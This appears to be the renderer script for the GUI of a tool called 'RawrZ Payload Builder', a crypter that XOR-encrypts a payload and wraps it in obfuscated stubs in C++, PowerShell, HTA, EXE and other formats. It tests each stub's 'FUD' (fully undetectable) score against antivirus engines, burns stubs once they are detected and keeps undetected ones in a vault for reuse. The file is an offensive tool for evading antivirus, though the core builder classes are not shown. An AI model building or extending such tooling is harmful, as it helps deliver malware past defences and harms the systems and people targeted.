// RawrZ Payload Builder - Main Renderer Script
// Connects GUI with core payload building functionality

let payloadBuilder;
let fudTester;
let burnReuseSystem;
let currentStub = null;

// Initialize when DOM loads
document.addEventListener('DOMContentLoaded', function() {
    initializeBuilder();
    setupEventListeners();
    updateInterface();
});

function initializeBuilder() {
    payloadBuilder = new RawrZPayloadBuilder();
    fudTester = new FUDTester();
    burnReuseSystem = new BurnReuseSystem();
    
    console.log('RawrZ Payload Builder initialized');
    console.log('Available modules:', Array.from(payloadBuilder.modules.keys()));
}

function setupEventListeners() {
    // Module checkboxes
    document.querySelectorAll('.module-checkbox').forEach(checkbox => {
        checkbox.addEventListener('change', function() {
            const moduleName = this.getAttribute('data-module');
            const module = payloadBuilder.modules.get(moduleName);
            if (module) {
                module.enabled = this.checked;
                updateEnabledModules();
            }
        });
    });

    // Generate stub button
    const generateBtn = document.getElementById('generate-stub');
    if (generateBtn) {
        generateBtn.addEventListener('click', generateStub);
    }

    // Test FUD button
    const testFudBtn = document.getElementById('test-fud');
    if (testFudBtn) {
        testFudBtn.addEventListener('click', testCurrentStub);
    }

    // Burn stub button
    const burnBtn = document.getElementById('burn-stub');
    if (burnBtn) {
        burnBtn.addEventListener('click', burnCurrentStub);
    }

    // Save to vault button
    const vaultBtn = document.getElementById('save-vault');
    if (vaultBtn) {
        vaultBtn.addEventListener('click', saveToVault);
    }

    // Load from vault button
    const loadVaultBtn = document.getElementById('load-vault');
    if (loadVaultBtn) {
        loadVaultBtn.addEventListener('click', loadFromVault);
    }

    // Language and format selectors
    const languageSelect = document.getElementById('language-select');
    const formatSelect = document.getElementById('format-select');
    
    if (languageSelect) {
        languageSelect.addEventListener('change', updateFormatOptions);
    }
}

function updateEnabledModules() {
    const enabledModules = payloadBuilder.getEnabledModules();
    const moduleList = document.getElementById('enabled-modules-list');
    
    if (moduleList) {
        moduleList.innerHTML = enabledModules.length > 0 ? 
            enabledModules.map(m => `<div class="enabled-module">${m.name}</div>`).join('') :
            '<div class="no-modules">No modules enabled</div>';
    }
    
    // Update module count
    const moduleCount = document.getElementById('module-count');
    if (moduleCount) {
        moduleCount.textContent = enabledModules.length;
    }
}

function updateFormatOptions() {
    const language = document.getElementById('language-select')?.value;
    const formatSelect = document.getElementById('format-select');
    
    if (!formatSelect || !language) return;
    
    const formatOptions = {
        cpp: ['exe', 'dll', 'lib'],
        python: ['py', 'pyc', 'exe'],
        csharp: ['exe', 'dll', 'msi'],
        javascript: ['js', 'exe', 'hta'],
        powershell: ['ps1', 'exe', 'bat'],
        java: ['jar', 'class', 'exe'],
        go: ['exe', 'bin'],
        rust: ['exe', 'lib']
    };
    
    const options = formatOptions[language] || ['exe'];
    formatSelect.innerHTML = options.map(opt => 
        `<option value="${opt}">${opt.toUpperCase()}</option>`
    ).join('');
}

async function generateStub() {
    const generateBtn = document.getElementById('generate-stub');
    const language = document.getElementById('language-select')?.value || 'cpp';
    const format = document.getElementById('format-select')?.value || 'exe';
    const payloadInput = document.getElementById('payload-input')?.value;
    
    if (!payloadInput) {
        showNotification('Please provide payload data', 'error');
        return;
    }
    
    // Disable button during generation
    if (generateBtn) {
        generateBtn.disabled = true;
        generateBtn.textContent = 'Generating...';
    }
    
    try {
        // Simulate payload encryption
        const encryptedPayload = new Uint8Array(
            Array.from(payloadInput).map(char => char.charCodeAt(0) ^ 0xAA)
        );
        
        // Generate stub
        currentStub = payloadBuilder.generateStub(language, format, encryptedPayload, {
            obfuscation: document.getElementById('obfuscation-level')?.value || 'medium',
            compression: document.getElementById('enable-compression')?.checked || false
        });
        
        currentStub.id = Date.now().toString();
        currentStub.generatedAt = new Date();
        
        // Display generated stub
        displayGeneratedStub(currentStub);
        
        // Add to burn queue
        burnReuseSystem.addToBurnQueue(currentStub);
        updateBurnQueueDisplay();
        
        showNotification('Stub generated successfully!', 'success');
        
    } catch (error) {
        console.error('Stub generation failed:', error);
        showNotification('Stub generation failed: ' + error.message, 'error');
    } finally {
        if (generateBtn) {
            generateBtn.disabled = false;
            generateBtn.textContent = 'Generate Stub';
        }
    }
}

function displayGeneratedStub(stub) {
    const stubOutput = document.getElementById('stub-output');
    if (!stubOutput) return;
    
    stubOutput.innerHTML = `
        <div class="stub-info">
            <h3>Generated Stub</h3>
            <div class="stub-details">
                <div><strong>Language:</strong> ${stub.language.toUpperCase()}</div>
                <div><strong>Format:</strong> ${stub.format.toUpperCase()}</div>
                <div><strong>Size:</strong> ${(stub.size / 1024).toFixed(2)} KB</div>
                <div><strong>Modules:</strong> ${stub.modules.join(', ')}</div>
                <div><strong>Generated:</strong> ${stub.generatedAt.toLocaleString()}</div>
            </div>
        </div>
        <div class="stub-code">
            <h4>Generated Code (Preview)</h4>
            <textarea readonly>${stub.code.substring(0, 1000)}${stub.code.length > 1000 ? '...\n\n[Truncated - Full code available for export]' : ''}</textarea>
        </div>
        <div class="stub-actions">
            <button onclick="exportStub()" class="btn-secondary">Export Code</button>
            <button onclick="testCurrentStub()" class="btn-primary">Test FUD</button>
        </div>
    `;
}

async function testCurrentStub() {
    if (!currentStub) {
        showNotification('No stub to test', 'error');
        return;
    }
    
    const testBtn = document.getElementById('test-fud');
    if (testBtn) {
        testBtn.disabled = true;
        testBtn.textContent = 'Testing...';
    }
    
    try {
        // Show scanning progress
        showScanProgress();
        
        // Perform FUD test
        const scanResult = await fudTester.scanFile(currentStub.id);
        
        if (scanResult) {
            displayScanResults(scanResult);
            updateFUDStats();
            
            // Check if stub should be added to vault
            if (scanResult.fudScore >= 80) {
                showNotification(`Excellent FUD score: ${scanResult.fudScore}%! Consider saving to vault.`, 'success');
            } else if (scanResult.fudScore < 50) {
                showNotification(`Low FUD score: ${scanResult.fudScore}%. Consider burning this stub.`, 'warning');
            }
        }
        
    } catch (error) {
        console.error('FUD test failed:', error);
        showNotification('FUD test failed: ' + error.message, 'error');
    } finally {
        if (testBtn) {
            testBtn.disabled = false;
            testBtn.textContent = 'Test FUD';
        }
        hideScanProgress();
    }
}

function showScanProgress() {
    const progressDiv = document.getElementById('scan-progress');
    if (progressDiv) {
        progressDiv.style.display = 'block';
        
        let progress = 0;
        const progressBar = progressDiv.querySelector('.progress-bar');
        const progressText = progressDiv.querySelector('.progress-text');
        
        const interval = setInterval(() => {
            progress += Math.random() * 15;
            if (progress > 95) progress = 95;
            
            if (progressBar) progressBar.style.width = progress + '%';
            if (progressText) progressText.textContent = `Scanning: ${Math.round(progress)}%`;
        }, 200);
        
        // Store interval for cleanup
        progressDiv.progressInterval = interval;
    }
}

function hideScanProgress() {
    const progressDiv = document.getElementById('scan-progress');
    if (progressDiv) {
        if (progressDiv.progressInterval) {
            clearInterval(progressDiv.progressInterval);
        }
        progressDiv.style.display = 'none';
    }
}

function displayScanResults(scanResult) {
    const resultsDiv = document.getElementById('fud-results');
    if (!resultsDiv) return;
    
    const fudClass = scanResult.fudScore >= 80 ? 'high' : 
                    scanResult.fudScore >= 60 ? 'medium' : 'low';
    
    resultsDiv.innerHTML = `
        <div class="scan-result">
            <div class="fud-score fud-${fudClass}">
                <div class="score-circle">
                    <span class="score-number">${scanResult.fudScore}%</span>
                    <span class="score-label">FUD</span>
                </div>
            </div>
            <div class="scan-details">
                <div class="scan-stats">
                    <div class="stat">
                        <span class="stat-number">${scanResult.cleanBy}</span>
                        <span class="stat-label">Clean</span>
                    </div>
                    <div class="stat">
                        <span class="stat-number">${scanResult.detectedBy}</span>
                        <span class="stat-label">Detected</span>
                    </div>
                    <div class="stat">
                        <span class="stat-number">${scanResult.totalEngines}</span>
                        <span class="stat-label">Total</span>
                    </div>
                </div>
                <div class="scan-recommendations">
                    <h4>Recommendations:</h4>
                    ${scanResult.recommendations.map(rec => `<div class="recommendation">${rec}</div>`).join('')}
                </div>
            </div>
        </div>
    `;
}

function updateFUDStats() {
    const avgDetection = fudTester.getAverageDetectionRate();
    const fudTrend = fudTester.getFUDTrend();
    const totalScans = fudTester.scanHistory.length;
    
    const statsDiv = document.getElementById('fud-statistics');
    if (statsDiv) {
        statsDiv.innerHTML = `
            <div class="stat-item">
                <span class="stat-label">Average Detection:</span>
                <span class="stat-value">${avgDetection}%</span>
            </div>
            <div class="stat-item">
                <span class="stat-label">FUD Trend:</span>
                <span class="stat-value trend-${fudTrend}">${fudTrend}</span>
            </div>
            <div class="stat-item">
                <span class="stat-label">Total Scans:</span>
                <span class="stat-value">${totalScans}</span>
            </div>
        `;
    }
}

function burnCurrentStub() {
    if (!currentStub) {
        showNotification('No stub to burn', 'error');
        return;
    }
    
    const burned = burnReuseSystem.checkBurnStatus(currentStub.id);
    if (burned) {
        showNotification('Stub burned successfully!', 'success');
        currentStub = null;
        document.getElementById('stub-output').innerHTML = '<div class="no-stub">No stub generated</div>';
    }
    
    updateBurnQueueDisplay();
}

function saveToVault() {
    if (!currentStub) {
        showNotification('No stub to save', 'error');
        return;
    }
    
    // Get last FUD score
    const lastScan = fudTester.scanResults[fudTester.scanResults.length - 1];
    const fudScore = lastScan ? lastScan.fudScore : 0;
    
    const saved = burnReuseSystem.addToVault(currentStub, fudScore);
    if (saved) {
        showNotification(`Stub saved to vault with ${fudScore}% FUD!`, 'success');
        updateVaultDisplay();
    } else {
        showNotification(`FUD score too low (${fudScore}%). Need 80%+ for vault.`, 'warning');
    }
}

function loadFromVault() {
    const stub = burnReuseSystem.getFromVault({ minFUD: 80 });
    if (stub) {
        currentStub = stub;
        displayGeneratedStub(stub);
        showNotification('Stub loaded from vault!', 'success');
        updateVaultDisplay();
    } else {
        showNotification('No suitable stubs in vault', 'warning');
    }
}

function updateBurnQueueDisplay() {
    const status = burnReuseSystem.getBurnQueueStatus();
    const queueDiv = document.getElementById('burn-queue-status');
    
    if (queueDiv) {
        queueDiv.innerHTML = `
            <div class="queue-stats">
                <div class="queue-stat">
                    <span class="stat-number">${status.active}</span>
                    <span class="stat-label">Active</span>
                </div>
                <div class="queue-stat">
                    <span class="stat-number">${status.burned}</span>
                    <span class="stat-label">Burned</span>
                </div>
            </div>
            <div class="queue-list">
                ${status.queue.slice(-5).map(item => `
                    <div class="queue-item ${item.burned ? 'burned' : 'active'}">
                        <span class="item-id">${item.id.substring(0, 8)}</span>
                        <span class="item-uses">${item.uses}/${burnReuseSystem.burnThreshold}</span>
                        <span class="item-status">${item.burned ? 'Burned' : 'Active'}</span>
                    </div>
                `).join('')}
            </div>
        `;
    }
}

function updateVaultDisplay() {
    const status = burnReuseSystem.getVaultStatus();
    const vaultDiv = document.getElementById('vault-status');
    
    if (vaultDiv) {
        vaultDiv.innerHTML = `
            <div class="vault-stats">
                <div class="vault-stat">
                    <span class="stat-number">${status.total}</span>
                    <span class="stat-label">Total</span>
                </div>
                <div class="vault-stat">
                    <span class="stat-number">${status.highFUD}</span>
                    <span class="stat-label">High FUD</span>
                </div>
                <div class="vault-stat">
                    <span class="stat-number">${status.averageFUD}%</span>
                    <span class="stat-label">Avg FUD</span>
                </div>
            </div>
            <div class="vault-list">
                ${status.vault.slice(-5).map(item => `
                    <div class="vault-item">
                        <span class="item-id">${item.id.substring(0, 8)}</span>
                        <span class="item-fud">${item.fudScore}%</span>
                        <span class="item-reused">${item.timesReused}x</span>
                    </div>
                `).join('')}
            </div>
        `;
    }
}

function exportStub() {
    if (!currentStub) {
        showNotification('No stub to export', 'error');
        return;
    }
    
    // Create download link for stub export
    const blob = new Blob([currentStub.code], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `stub_${currentStub.id}.${currentStub.language}`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
    
    showNotification('Stub exported successfully!', 'success');
}

function showNotification(message, type = 'info') {
    const notification = document.createElement('div');
    notification.className = `notification notification-${type}`;
    notification.textContent = message;
    
    // Add to notification container or body
    const container = document.getElementById('notification-container') || document.body;
    container.appendChild(notification);
    
    // Auto-remove after 3 seconds
    setTimeout(() => {
        if (notification.parentNode) {
            notification.parentNode.removeChild(notification);
        }
    }, 3000);
}

function updateInterface() {
    // Update initial state
    updateEnabledModules();
    updateFormatOptions();
    updateBurnQueueDisplay();
    updateVaultDisplay();
    updateFUDStats();
}

// Initialize module checkboxes based on enabled state
function initializeModuleCheckboxes() {
    document.addEventListener('DOMContentLoaded', function() {
        document.querySelectorAll('.module-checkbox').forEach(checkbox => {
            const moduleName = checkbox.getAttribute('data-module');
            if (payloadBuilder && payloadBuilder.modules) {
                const module = payloadBuilder.modules.get(moduleName);
                if (module) {
                    checkbox.checked = module.enabled;
                }
            }
        });
    });
}